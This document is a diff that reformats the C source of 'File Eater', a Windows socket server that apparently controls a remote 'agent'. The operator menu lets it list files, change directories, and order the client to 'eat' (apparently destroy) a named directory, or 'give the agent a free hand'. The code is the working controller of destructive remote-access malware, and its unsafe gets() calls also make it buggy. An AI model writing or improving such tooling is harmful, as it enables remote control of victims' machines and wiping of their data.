@@ -1,76 +1,81 @@
-#include<stdio.h>
-#include<winsock2.h>
-#include<string.h>
+#include <stdio.h>
+#include <winsock2.h>
+#include <string.h>
 
-#pragma comment(lib,"ws2_32.lib")
+#pragma comment(lib, "ws2_32.lib")
 
 // Declaring needed variables globally
 WSADATA wsa;
 SOCKET s, new_socket;
 struct sockaddr_in server, client;
 int c, recv_size;
-char buffer[2048], dirName[2048];;
-
+char buffer[2048], dirName[2048];
+;
 
 // Repetitive code declared as functions here...
 
 // Called when any error is caught, to stop the program then and there
-void error() {
-		exit(1);
+void error()
+{
+	exit(1);
 }
 
 // Initialize WinSock
-void initWinSock() {
-	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
+void initWinSock()
+{
+	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
 	{
-		printf("\nFailed. Error Code : %d",WSAGetLastError());
+		printf("\nFailed. Error Code : %d", WSAGetLastError());
 		error();
 	}
 }
 
 // Create and initialize socket
-void createAndBindSock() {
+void createAndBindSock()
+{
 
-	if((s = socket(AF_INET , SOCK_STREAM , IPPROTO_TCP )) == INVALID_SOCKET)
+	if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
 	{
-		printf("\n[!] Could not create socket : %d" , WSAGetLastError());
+		printf("\n[!] Could not create socket : %d", WSAGetLastError());
 		error();
 	}
 
-	//Prepare the sockaddr_in structure
+	// Prepare the sockaddr_in structure
 	server.sin_family = AF_INET;
 	server.sin_addr.s_addr = INADDR_ANY;
-	server.sin_port = htons( 8888 );
-	
-	//Bind
-	if( bind(s ,(struct sockaddr *)&server , sizeof(server)) == SOCKET_ERROR)
+	server.sin_port = htons(8888);
+
+	// Bind
+	if (bind(s, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR)
 	{
-		printf("\nBind failed with error code : %d" , WSAGetLastError());
+		printf("\nBind failed with error code : %d", WSAGetLastError());
 		error();
 	}
 }
 
 // Listen for any incomming connections and accept them
-void listenAndAcceptConn() {
-	listen(s , 3);
+void listenAndAcceptConn()
+{
+	listen(s, 3);
 
 	c = sizeof(struct sockaddr_in);
-	new_socket = accept(s , (struct sockaddr *)&client, &c);
+	new_socket = accept(s, (struct sockaddr *)&client, &c);
 	if (new_socket == INVALID_SOCKET)
 	{
-		printf("\naccept failed with error code : %d" , WSAGetLastError());
+		printf("\naccept failed with error code : %d", WSAGetLastError());
 		error();
 	}
-
 }
 
 // Recieve data and load it into buffer
-void reliableRecieve() {
+void reliableRecieve()
+{
 
 	// Cleaning buffer before data comes.
-	memset(buffer,0,strlen(buffer));
+	memset(buffer, 0, strlen(buffer));
 
-	if ((recv_size = recv(new_socket, buffer, sizeof(buffer), 0)) == SOCKET_ERROR) {
+	if ((recv_size = recv(new_socket, buffer, sizeof(buffer), 0)) == SOCKET_ERROR)
+	{
 		printf("\n[!] Recieve Failed.");
 	}
 
@@ -78,14 +83,15 @@ void reliableRecieve() {
 }
 
 // Send all the data in the buffer
-void reliableSend() {
-	//Sending message to client
-	send(new_socket , buffer , strlen(buffer) , 0);
-
+void reliableSend()
+{
+	// Sending message to client
+	send(new_socket, buffer, strlen(buffer), 0);
 }
 
 // Show the skull animation
-void showAnimation() {
+void showAnimation()
+{
 	system("cls");
 	fprintf(stderr, "         _______________\n");
 	fprintf(stderr, "        /               \\\n");
@@ -118,7 +124,8 @@ void showAnimation() {
 
 	int jawLength = 10;
 
-	for (int i = 0; i < jawLength; i++) {
+	for (int i = 0; i < jawLength; i++)
+	{
 		system("cls");
 		fprintf(stderr, "         _______________\n");
 		fprintf(stderr, "        /               \\\n");
@@ -132,7 +139,8 @@ void showAnimation() {
 		fprintf(stderr, "        |\\     XXX     /|\n");
 		fprintf(stderr, "        | I I I I I I I |\n");
 		fprintf(stderr, "        |               |\n");
-		for (int j = 0; j < i; j++) {
+		for (int j = 0; j < i; j++)
+		{
 			fprintf(stderr, "        |               |\n");
 		}
 		fprintf(stderr, "        |               |\n");
@@ -149,53 +157,62 @@ void showAnimation() {
 		fprintf(stderr, "XXXXX                        XXXXX\n");
 		fprintf(stderr, "  XXX                        XXX\n");
 
-		if (i % 2 == 0) {
+		if (i % 2 == 0)
+		{
 			system("color 70");
-		} else {
+		}
+		else
+		{
 			system("color 07");
 		}
 
-		if (i < (int) jawLength / 2) {
+		if (i < (int)jawLength / 2)
+		{
 			Sleep(20);
-		} else {
+		}
+		else
+		{
 			Sleep(10);
 		}
 	}
-	
+
 	system("color 07");
 	system("cls");
-	}
+}
 
 // Put data in buffer
-void writeToBuffer(char data[]) {
+void writeToBuffer(char data[])
+{
 	// Clearing old data
-	memset(buffer,0,strlen(buffer));
+	memset(buffer, 0, strlen(buffer));
 
 	// Putting new data
 	strcpy(buffer, data);
 }
 
-int main(int argc , char *argv[])
+int main(int argc, char *argv[])
 {
 
 	// Main Code
 	showAnimation();
-	
+
 	system("cls");
-	fprintf(stderr, "=====================================================\n");
-	fprintf(stderr, "                   WELCOME TO FILE EATER\n");
-	fprintf(stderr, "=====================================================\n");
 
-	Sleep(100);
-
+	fprintf(stderr, "___________.__.__           ___________       __                \n");
+	fprintf(stderr, "\\_   _____/|__|  |   ____   \\_   _____/____ _/  |_  ___________ \n");
+	fprintf(stderr, " |    __)  |  |  | _/ __ \\   |    __)_\\__  \\   __\\/ __ \\_  __ \\\n");
+	fprintf(stderr, " |     \\   |  |  |_\\  ___/   |        \\/ __ \\|  | \\  ___/|  | \\/\n");
+	fprintf(stderr, " \\___  /   |__|____/\\___  > /_______  (____  /__|  \\___  >__|   \n");
+	fprintf(stderr, "     \\/                 \\/          \\/     \\/          \\/       \n");
 	fprintf(stderr, "\n");
 
+	Sleep(100);
+	fprintf(stderr, "[+] Welcome...\n");
 
 	fprintf(stderr, "[+] Setting things up...\r");
 	initWinSock();
 	createAndBindSock();
 	fprintf(stderr, "[+] Setting things up... Done.\n");
-
 
 	fprintf(stderr, "[+] Listening for connections...\n");
 	listenAndAcceptConn();
@@ -203,7 +220,8 @@ int main(int argc , char *argv[])
 
 	int running = 1;
 
-	while (running) {
+	while (running)
+	{
 		int choice = -1;
 		fprintf(stderr, "\nThese are your options :-\n\n");
 		fprintf(stderr, "[0] Quit.\n");
@@ -215,120 +233,115 @@ int main(int argc , char *argv[])
 		fprintf(stderr, "[6] Give Agent File Eater free hand.\n");
 		fprintf(stderr, "[7] Ask Agent File Eater to wait for instructions.\n");
 
-
 		fprintf(stderr, "\nYour selected option: ");
 		fflush(stdin);
 		scanf("%d", &choice);
-		
-		switch (choice) {
-			case 0:
-				running = 0;
-				break;
 
-			case 1:
-				fprintf(stderr, "\n[+] Requesting client to send files data...");
+		switch (choice)
+		{
+		case 0:
+			running = 0;
+			break;
 
-				// Asking client to send directory data
-				writeToBuffer(" 1");
-				reliableSend();
+		case 1:
+			fprintf(stderr, "\n[+] Requesting client to send files data...");
 
-				// Recieving direcory data
-				reliableRecieve();
-				fprintf(stderr, "\n[+] Recieved files data from client.");
-				fprintf(stderr, "\n%s", buffer);
+			// Asking client to send directory data
+			writeToBuffer(" 1");
+			reliableSend();
 
-				break;
+			// Recieving direcory data
+			reliableRecieve();
+			fprintf(stderr, "\n[+] Recieved files data from client.");
+			fprintf(stderr, "\n%s", buffer);
 
-			case 2:
-				fprintf(stderr, "\n[+] Requesting client to send current working directory...");
+			break;
 
-				// Asking client to send cwd
-				writeToBuffer(" 2");
-				reliableSend();
+		case 2:
+			fprintf(stderr, "\n[+] Requesting client to send current working directory...");
 
-				// Recieving data
-				reliableRecieve();
-				fprintf(stderr, "\n[+] CWD is: ");
-				fprintf(stderr, "\n%s", buffer);
+			// Asking client to send cwd
+			writeToBuffer(" 2");
+			reliableSend();
 
-				break;
+			// Recieving data
+			reliableRecieve();
+			fprintf(stderr, "\n[+] CWD is: ");
+			fprintf(stderr, "\n%s", buffer);
 
-			case 3:
-				// Asking client to switch to a folder
-				writeToBuffer(" 3");
-				reliableSend();
+			break;
 
-				fprintf(stderr, "\n[+] Requesting client to go to specific directory...");
+		case 3:
+			// Asking client to switch to a folder
+			writeToBuffer(" 3");
+			reliableSend();
 
-				// Sending folder name to client
-				
+			fprintf(stderr, "\n[+] Requesting client to go to specific directory...");
 
-				memset(buffer,0,strlen(dirName));
-				
-				fprintf(stderr, "\nEnter name of the directory you want to switch to: ");
-				fflush(stdin);
-				gets(dirName);
+			// Sending folder name to client
 
-				writeToBuffer(dirName);
-				reliableSend();
+			memset(buffer, 0, strlen(dirName));
 
-				// Recieving data
-				reliableRecieve();
-				fprintf(stderr, "\n[+] CWD changed to: ");
-				fprintf(stderr, "\n%s", buffer);
+			fprintf(stderr, "\nEnter name of the directory you want to switch to: ");
+			fflush(stdin);
+			gets(dirName);
 
-				break;
+			writeToBuffer(dirName);
+			reliableSend();
 
+			// Recieving data
+			reliableRecieve();
+			fprintf(stderr, "\n[+] CWD changed to: ");
+			fprintf(stderr, "\n%s", buffer);
 
-			case 4:
-				fprintf(stderr, "\n[+] Requesting client to go to parent directory...");
+			break;
 
-				// Asking client to send cwd
-				writeToBuffer(" 4");
-				reliableSend();
+		case 4:
+			fprintf(stderr, "\n[+] Requesting client to go to parent directory...");
 
-				// Recieving data
-				reliableRecieve();
-				fprintf(stderr, "\n[+] CWD changed to: ");
-				fprintf(stderr, "\n%s", buffer);
+			// Asking client to send cwd
+			writeToBuffer(" 4");
+			reliableSend();
 
-				break;
+			// Recieving data
+			reliableRecieve();
+			fprintf(stderr, "\n[+] CWD changed to: ");
+			fprintf(stderr, "\n%s", buffer);
 
-			case 5:
-				// Asking client to eat a folder
-				writeToBuffer(" 5");
-				reliableSend();
+			break;
 
-				fprintf(stderr, "\n[+] Requesting client to eat a specific directory...");
+		case 5:
+			// Asking client to eat a folder
+			writeToBuffer(" 5");
+			reliableSend();
 
-				// Sending folder name to client
-				
+			fprintf(stderr, "\n[+] Requesting client to eat a specific directory...");
 
-				memset(buffer,0,strlen(dirName));
-				
-				fprintf(stderr, "\nEnter name of the directory you want to eat: ");
-				fflush(stdin);
-				gets(dirName);
+			// Sending folder name to client
 
-				writeToBuffer(dirName);
-				reliableSend();
+			memset(buffer, 0, strlen(dirName));
 
-				// Recieving data
-				reliableRecieve();
-				fprintf(stderr, "\n[+] File eater says:");
-				fprintf(stderr, "\n%s", buffer);
+			fprintf(stderr, "\nEnter name of the directory you want to eat: ");
+			fflush(stdin);
+			gets(dirName);
 
-				break;
+			writeToBuffer(dirName);
+			reliableSend();
 
-			default:
-				fprintf(stderr, "Incorrect Option Chosen.");
-				break;
-			
+			// Recieving data
+			reliableRecieve();
+			fprintf(stderr, "\n[+] File eater says:");
+			fprintf(stderr, "\n%s", buffer);
 
+			break;
 
+		default:
+			fprintf(stderr, "Incorrect Option Chosen.");
+			break;
 		}
 
-		if (choice != 0){
+		if (choice != 0)
+		{
 			fflush(stdin);
 			printf("\n\nPress any key to continue...");
 			getchar();
